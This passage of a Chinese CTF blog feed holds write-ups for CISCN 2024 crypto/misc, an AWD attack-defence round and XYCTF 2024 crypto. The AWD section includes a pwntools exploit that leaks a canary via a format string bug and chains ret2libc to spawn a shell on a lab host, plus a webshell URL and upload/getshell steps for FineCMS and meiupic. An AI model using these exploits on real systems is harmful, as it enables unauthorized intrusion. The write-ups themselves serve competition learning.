href="https://xz.aliyun.com/t/10076?time__1311=mq%2BxBD9QDQe8D%2FFi4BKkPWw2DIxYqD%3D1O4D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-1">ATT&amp;CK实战系列——红队实战(一) - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124329382">[内网渗透]——VulnStack (一)_vulnstack一-CSDN博客</a></p><p><a href="https://www.cnblogs.com/carmi/p/17666712.html">VulnStack - ATT&amp;CK红队评估实战(一) Writeup - gcc_com - 博客园 (cnblogs.com)</a></p><p><a href="https://lca.xlog.app/ATTCK-hong-dui-ping-gu-shi-zhan-ba-chang--1?locale=zh">ATT&amp;CK红队评估实战靶场-1 - lca (xlog.app)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn2024</title>
    <link href="/2024/05/18/ciscn2024/"/>
    <url>/2024/05/18/ciscn2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h2><script type="math/tex; mode=display">e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1</script><script type="math/tex; mode=display">e = 65537 + kk * p + (kk+2) * ((p+1) * (q+1)) + 1</script><script type="math/tex; mode=display">e = 65537 + kk * p + (kk+2) *n+(kk+2) * p+(kk+2)  * q + 1</script><p>因为k为128位，p,q为512位，e近似（kk+2）*n,所以</p><script type="math/tex; mode=display">k=e//n-2</script><p>等式两边同乘以p</p><script type="math/tex; mode=display">e*p = 65537*p + kk * p^2 + (kk+2) *n*p+(kk+2) * p^2+(kk+2)  * n + p</script><p>所以存在</p><script type="math/tex; mode=display">e_h*p_h = 65537*p_h + kk * n + (kk+2) *n*p_h+(kk+2) * n+(kk+2)  * p_h^2 + p_h</script><p>解方程可得到p的高位，然后就是已知p的高位求解，直接套板子</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import * <br> <br><span class="hljs-attribute">n</span> = <span class="hljs-number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span><br><br><span class="hljs-attribute">k</span> = e // n - <span class="hljs-number">2</span> <br><br><span class="hljs-attribute">R</span>.&lt;x&gt; = PolynomialRing(RealField(<span class="hljs-number">1024</span>)) <br><br><span class="hljs-attribute">f</span>=e*x-(<span class="hljs-number">65538</span>*x+k*x^<span class="hljs-number">2</span>+(k+<span class="hljs-number">2</span>)*n*x+(k+<span class="hljs-number">2</span>)*x^<span class="hljs-number">2</span>+(k+<span class="hljs-number">2</span>)*n)<br><br><span class="hljs-attribute">res</span> = f.roots() <br> <br><span class="hljs-attribute">for</span> i in res: <br>    <span class="hljs-attribute">p_h</span> = int(i[<span class="hljs-number">0</span>]) <br>    <span class="hljs-attribute">PR</span>.&lt;x&gt; = PolynomialRing(Zmod(n)) <br>    <span class="hljs-attribute">f1</span> = x + p_h<br>    <span class="hljs-attribute">roots</span> = f1.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">200</span>,beta=<span class="hljs-number">0</span>.<span class="hljs-number">4</span>) <br>    <span class="hljs-attribute">if</span> roots: <br>        <span class="hljs-attribute">p</span> = int(roots[<span class="hljs-number">0</span>]) + p_h<br>        <span class="hljs-comment">#print(p,n%p)</span><br>        <span class="hljs-attribute">if</span> p and n%p==<span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">q</span>= n // p<br>            <span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span> + k * p + (k+<span class="hljs-number">2</span>) * ((p+<span class="hljs-number">1</span>) * (q+<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span> <br>            <span class="hljs-attribute">d</span> = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)) <br>            <span class="hljs-attribute">m</span> = pow(c,d,n) <br>            <span class="hljs-attribute">print</span>(long_to_bytes(int(m)))<br>            <br><span class="hljs-comment">#b&#x27;flag&#123;b5f771c6-18df-49a9-9d6d-ee7804f5416c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><p>Atbash+base64+栅栏</p><img src="/2024/05/18/ciscn2024/image-20240519105742144.png" class title="image-20240519105742144"><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h2><h3 id="Part1-flag-e"><a href="#Part1-flag-e" class="headerlink" title="Part1:flag{e"></a>Part1:flag{e</h3><p>docx文件里Bifid cipher加base64</p><img src="/2024/05/18/ciscn2024/image-20240518213124567.png" class title="image-20240518213124567"><h3 id="part2-675efb"><a href="#part2-675efb" class="headerlink" title="part2:675efb"></a>part2:675efb</h3><p>改成压缩包后得到docx，再改后缀为zip，发现</p><img src="/2024/05/18/ciscn2024/image-20240518211420871.png" class title="image-20240518211420871"><img src="/2024/05/18/ciscn2024/image-20240518211327277.png" class title="image-20240518211327277"><h3 id="PArt3-3-34"><a href="#PArt3-3-34" class="headerlink" title="PArt3:3-34"></a>PArt3:3-34</h3><p>bin文件010分析，rc4、base64解码</p><img src="/2024/05/18/ciscn2024/image-20240518210645246.png" class title="image-20240518210645246"><h3 id="Payt4-6f-40"><a href="#Payt4-6f-40" class="headerlink" title="Payt4:6f-40"></a>Payt4:6f-40</h3><p>ppt里发现</p><img src="/2024/05/18/ciscn2024/image-20240518210043082.png" class title="image-20240518210043082"><h3 id="pArt5-5f-90d"><a href="#pArt5-5f-90d" class="headerlink" title="pArt5:5f-90d"></a>pArt5:5f-90d</h3><p>6轮base64</p><img src="/2024/05/18/ciscn2024/image-20240518210256516.png" class title="image-20240518210256516"><h3 id="ParT6-d-2"><a href="#ParT6-d-2" class="headerlink" title="ParT6:d-2"></a>ParT6:d-2</h3><p>改成zip发现未显示图片</p><img src="/2024/05/18/ciscn2024/image-20240518205728241.png" class title="image-20240518205728241"><h3 id="PART7-22b3"><a href="#PART7-22b3" class="headerlink" title="PART7=22b3"></a>PART7=22b3</h3><p>rot13解密</p><img src="/2024/05/18/ciscn2024/image-20240518213516223.png" class title="image-20240518213516223"><h3 id="paRt8-87e"><a href="#paRt8-87e" class="headerlink" title="paRt8:87e"></a>paRt8:87e</h3><p>根据下面提示去掉B、b、1、3，再base64解密</p><img src="/2024/05/18/ciscn2024/image-20240518211705339.png" class title="image-20240518211705339"><h3 id="parT9-deH"><a href="#parT9-deH" class="headerlink" title="parT9:deH"></a>parT9:deH</h3><p>图片底部</p><img src="/2024/05/18/ciscn2024/image-20240518205311887.png" class title="image-20240518205311887"><p>base64解密</p><img src="/2024/05/18/ciscn2024/image-20240518205400848.png" class title="image-20240518205400848"><h3 id="PARt10-9"><a href="#PARt10-9" class="headerlink" title="PARt10:9}"></a>PARt10:9}</h3><p>维吉尼亚和base64解码</p><img src="/2024/05/18/ciscn2024/image-20240518211941669.png" class title="image-20240518211941669"><p>拼接得到</p><p>flag{e675efb3-346f-405f-90dd-222b387edeH9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信创AWD wp</title>
    <link href="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/"/>
    <url>/2024/05/13/%E4%BF%A1%E5%88%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>canary保护和NX保护</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513204847024.png" class title="image-20240513204847024"><p>ida查看，存在格式化字符串漏洞和栈溢出</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205056049.png" class title="image-20240513205056049"><p>因此思路是泄露canary保护，然后ret2libc</p><p>gdb本地调试</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513205653870.png" class title="image-20240513205653870"><p>发现0x7ffff7e1b780被泄露了，因此计算出canary偏移为11，输入%11$p得到</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211044393.png" class title="image-20240513211044393"><p>![image-20240513211218375](信创wp/image-20240513211218375.png</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211350110.png" class title="image-20240513211350110"><p>存在system和binsh，直接使用</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513211803077.png" class title="image-20240513211803077"><p>由于是64位程序，还需要ret、和pop rdi，ROPgadget查找</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212043740.png" class title="image-20240513212043740"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">p</span>=remote(&#x27;4.2.1.3&#x27;,9999)<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">0x0000000000400903 : pop rdi ; ret</span><br><span class="hljs-string">0x00000000004005e9 : ret</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-attribute">binsh</span>=0x400928<br><span class="hljs-attribute">system</span>=0x400630<br><span class="hljs-attribute">ret</span>=0x4005e9<br><span class="hljs-attribute">pop_rdi</span>=0x400903<br><br>p1 = <span class="hljs-string">&quot;%&#123;offset&#125;<span class="hljs-variable">$p</span>\n&quot;</span>.format(offset = 11)<br><span class="hljs-built_in">print</span>(p1)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p1)<br>leak_info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,drop = <span class="hljs-literal">True</span>)<br>canary = int(leak_info,16)<br>log.success(<span class="hljs-string">&quot;canary:&quot;</span> + hex(canary))<br>p2 = b<span class="hljs-string">&#x27;a&#x27;</span>*(0x20-8)+p64(canary)+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendafter(b<span class="hljs-string">&quot;[type &#x27;quit&#x27; to quit] prompt&gt; &quot;</span>,p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>0x50改为0x20</p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240513212528481.png" class title="image-20240513212528481"><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>存在puts，将printf改为puts</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="finecms"><a href="#finecms" class="headerlink" title="finecms"></a>finecms</h2><h3 id="漏洞1：一句话木马"><a href="#漏洞1：一句话木马" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h3><p>D盾扫出来个一句话木马</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525223420130.png" alt="image-20240525223420130"></p><h3 id="漏洞2：CSRF"><a href="#漏洞2：CSRF" class="headerlink" title="漏洞2：CSRF"></a>漏洞2：CSRF</h3><p>网站为FineCMS v5.4.0</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525224918694.png" alt="image-20240525224918694"></p><p>搜索得到</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240525225207421.png" alt="image-20240525225207421"></p><h3 id="漏洞3-弱密码"><a href="#漏洞3-弱密码" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h3><p>网站后台管理员账户（admin）存在弱密码 admin</p><h3 id="漏洞4：后台getshell"><a href="#漏洞4：后台getshell" class="headerlink" title="漏洞4：后台getshell"></a>漏洞4：后台getshell</h3><p>参考：<a href="https://www.cnblogs.com/hun-ya/p/9392211.html">FineCMS v5.4.1 后台getshell - _昏鸦 - 博客园 (cnblogs.com)</a></p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234047064.png" alt="image-20240531234047064"></p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240531234152179.png" alt="image-20240531234152179"></p><h3 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h3><p>网站下有phpinfo.php</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240601160047542.png" alt="image-20240601160047542"></p><h1 id="meiupic3"><a href="#meiupic3" class="headerlink" title="meiupic3"></a>meiupic3</h1><h2 id="漏洞1：一句话木马-1"><a href="#漏洞1：一句话木马-1" class="headerlink" title="漏洞1：一句话木马"></a>漏洞1：一句话木马</h2><p> 扫出来个木马</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140122585.png" alt="image-20240829140122585"></p><p>但是中间有函数报错，无法执行到木马处，估计出题人也没验证</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140138016.png" alt="image-20240829140138016"></p><p>修改下代码，验证</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">232.133</span>:<span class="hljs-number">7000</span><span class="hljs-regexp">//</span>templates<span class="hljs-regexp">/default/</span>common/<span class="hljs-number">404</span>.php?a=system&amp;b=ls<br></code></pre></td></tr></table></figure><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140221739.png" alt="image-20240829140221739"></p><h2 id="漏洞2：后台相册任意上传文件"><a href="#漏洞2：后台相册任意上传文件" class="headerlink" title="漏洞2：后台相册任意上传文件"></a>漏洞2：后台相册任意上传文件</h2><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140245445.png" alt="image-20240829140245445"></p><p>抓包修改上传后的名字为2.php,</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140329365.png" alt="image-20240829140329365"></p><p>访问/data/cache/tmp/2.php</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240829140342042.png" alt="image-20240829140342042"></p><h2 id="漏洞3-弱密码-1"><a href="#漏洞3-弱密码-1" class="headerlink" title="漏洞3:弱密码"></a>漏洞3:弱密码</h2><p>网站后台管理员账户（admin）存在弱密码 admin</p><h2 id="漏洞4：后台模板修改"><a href="#漏洞4：后台模板修改" class="headerlink" title="漏洞4：后台模板修改"></a>漏洞4：后台模板修改</h2><p>由于只有个别子目录存在写权限，当某php存在写权限，后台可修改代码getshell</p><p><img src="/2024/05/13/%E4%BF%A1%E5%88%9Bwp/image-20240901105149189.png" alt="image-20240901105149189"></p>]]></content>
    
    
    <categories>
      
      <category>AWD WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF2024WP</title>
    <link href="/2024/04/29/XYCTF2024WP/"/>
    <url>/2024/04/29/XYCTF2024WP/</url>
    
    <content type="html"><![CDATA[<p>题目顺序按照解题顺序排列，只打了前面两周，后面没看了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Sign1n-amp-Sign1n-reverg"><a href="#Sign1n-amp-Sign1n-reverg" class="headerlink" title="Sign1n & Sign1n_reverg"></a>Sign1n &amp; Sign1n_reverg</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from tqdm import *<br>import gmpy2<br>flag=b'XYCTF{uuid}'<br>flag=bytes_to_long(flag)<br>leak=bin(int(flag))<br>while 1:<br>    leak += "0"<br>    if len(leak) == 514:<br>        break<br>#swap_bits函数将input_str的二进制位前后颠倒<br>def swap_bits(input_str):<br>    input_list = list(input_str[2:])<br>    length = len(input_list)<br><br>    for i in range(length // 2):<br>        temp = input_list[i]<br>        input_list[i] = input_list[length - 1 - i]<br>        input_list[length - 1 - i] = temp<br><br>    return ''.join(input_list)<br><br>input_str = leak<br>result = swap_bits(input_str)<br>a=result<br>#custom_add将input_str的二进制数的每一位（0或1）加上i+1后对10取余<br>def custom_add(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) + i + 1) % 10)<br><br>    result = ''.join(input_list)<br>    return result<br><br><br>input_str = a<br>result = custom_add(input_str)<br>b=result<br>print(b)<br>#12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567891134567799112455779902334667900133556899112356678902344568890233457790013355689912335667990134456799023355788001244568991123467799012455778902335578800134456899123356678001344567991223557880012455689901235667801134457889023355788001345578890233566789013445778912235567900124557889013356678001344578801233467789112355779912234577990233556780113<br></code></pre></td></tr></table></figure><p>故只需将原代码中custom_add的加操作改为减再颠倒就是flag的二进制。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b = '<span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">90123456789012</span><span class="hljs-number">34567890123456</span><span class="hljs-number">78901234567890</span><span class="hljs-number">12345678901234</span><span class="hljs-number">56789012345678</span><span class="hljs-number">91134567799112</span><span class="hljs-number">45577990233466</span><span class="hljs-number">79001335568991</span><span class="hljs-number">12356678902344</span><span class="hljs-number">56889023345779</span><span class="hljs-number">00133556899123</span><span class="hljs-number">35667990134456</span><span class="hljs-number">79902335578800</span><span class="hljs-number">12445689911234</span><span class="hljs-number">67799012455778</span><span class="hljs-number">90233557880013</span><span class="hljs-number">44568991233566</span><span class="hljs-number">78001344567991</span><span class="hljs-number">22355788001245</span><span class="hljs-number">56899012356678</span><span class="hljs-number">01134457889023</span><span class="hljs-number">35578800134557</span><span class="hljs-number">88902335667890</span><span class="hljs-number">13445778912235</span><span class="hljs-number">56790012455788</span><span class="hljs-number">90133566780013</span><span class="hljs-number">44578801233467</span><span class="hljs-number">78911235577991</span><span class="hljs-number">22345779902335</span><span class="hljs-number">56780113</span>'<br><br>def custom_sub(input_str):<br>    input_list = list(input_str)<br>    length = len(input_list)<br><br>    for i in range(length):<br>        input_list[i] = str((int(input_list[i]) - i - <span class="hljs-number">1</span>) % <span class="hljs-number">10</span>)<br><br>    result = ''.join(input_list)<br>    return result<br>print(long_to_bytes(int(custom_sub(b)[::-<span class="hljs-number">1</span>].strip('0'), <span class="hljs-number">2</span>)))<span class="hljs-meta">#Sign1n需要去掉一个一个末尾的0</span><br><span class="hljs-meta">#b'XYCTF{24611067-c60f-427c-aaab-d17e4b81e2ee}'</span><br></code></pre></td></tr></table></figure><h3 id="happy-to-solve"><a href="#happy-to-solve" class="headerlink" title="happy_to_solve"></a>happy_to_solve</h3><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_happy_prime</span>():<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = sympy.nextprime(p ^ ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>) - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> p, q<br>m = bytes_to_long(flag)<br>p, q = get_happy_prime()<br>n = p * q<br>e = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-comment"># 24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-comment"># 14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><br></code></pre></td></tr></table></figure><script type="math/tex; mode=display">p+q=2^{512}+r</script><script type="math/tex; mode=display">(p+q)^2=(p-q)^2+4*p*q=(p-q)^2+4*n</script><script type="math/tex; mode=display">p-q=\sqrt{(p+q)^2-4*n}</script><p>爆破r，得到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="4.944ex" height="1.758ex" role="img" focusable="false" viewbox="0 -583 2185.4 777"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(725.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(1725.4,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g></g></svg></mjx-container> ,再尝试对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="7.692ex" height="2.452ex" role="img" focusable="false" viewbox="0 -833.9 3400 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(1114.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mi" transform="translate(2114.4,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="msup" transform="translate(2574.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 